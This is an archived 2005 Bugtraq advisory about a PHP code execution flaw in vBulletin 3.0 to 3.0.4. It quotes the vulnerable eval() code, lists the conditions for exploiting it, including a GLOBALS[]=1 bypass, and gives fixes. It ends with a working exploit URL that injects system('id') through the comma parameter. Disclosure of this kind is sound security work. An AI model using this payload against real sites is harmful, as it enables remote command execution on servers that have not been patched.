=== Content from marc.info_2c5cf8ec_20250125_021033.html ===

```
[[prev in list](?l=bugtraq&m=110841561126699&w=2)] [[next in list](?l=bugtraq&m=110840464126710&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=110849668908803&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [vbulletin 3.0.x PHP code execution](?t=110840816700004&r=1&w=2)
From:       [AL3NDALEEB <al3ndaleeb () uk2 ! net>](?a=110840831400001&r=1&w=2)
Date:       [2005-02-13 17:16:35](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050213171635.8776.qmail () www ! securityfocus ! com](?i=20050213171635.8776.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=110840807415315&q=mbox) or [body](?l=bugtraq&m=110840807415315&q=raw)]

Vulnerable Systems:
 ----------------
 vBulletin version 3.0 up to and including version 3.0.4

 Immune systems:
 ----------------
 vBulletin version 3.0.5
 vBulletin version 3.0.6

 Vulnerable code in forumdisplay.php :
 #############################################################
 if ($vboptions['showforumusers'])
 {
    .
    .
    .
    .

 if ($bbuserinfo['userid'])
 {
    .
    .
    .
    .
    $comma = ', ';
  }
 .
 .
 .
 .
 while ($loggedin = $DB_site->fetch_array($forumusers))
 {
    .
    .
    .
    eval('$activeusers .= "' . $comma . fetch_template('forumdisplay_loggedinuser') . \
'";');     <<==== (Vuln)  $comma = ', ';
    .
    .
  }
 .
 .
 }

 #############################################################

 Conditions:
 ----------------
 1st condition   : $vboptions['showforumusers'] == True , the admin must set
showforumusers ON in vbulletin options.
 2nd condition  : $bbuserinfo['userid'] == 0 , you must be an visitor/guest
.
 3rd condition  : $DB_site->fetch_array($forumusers) == True , when you
visit the forums, it  must has at least one user show the forum.
 4th condition   : magic_quotes_gpc must be OFF
 SPECIAL condition : you must bypass unset($GLOBALS["$_arrykey"]) code in
init.php by secret array GLOBALS[]=1 ;)))

 Solutions:
 ----------------
 * Disable showforumusers in vbulletin options .
 * add the next line before if ($vboptions['showforumusers'])
     $comma = '';

 Exploit:
 ----------------
example :
<http://site/forumdisplay.php?GLOBALS>[]=1&f=2&comma=".system('id')."

[[prev in list](?l=bugtraq&m=110841561126699&w=2)] [[next in list](?l=bugtraq&m=110840464126710&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=110849668908803&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


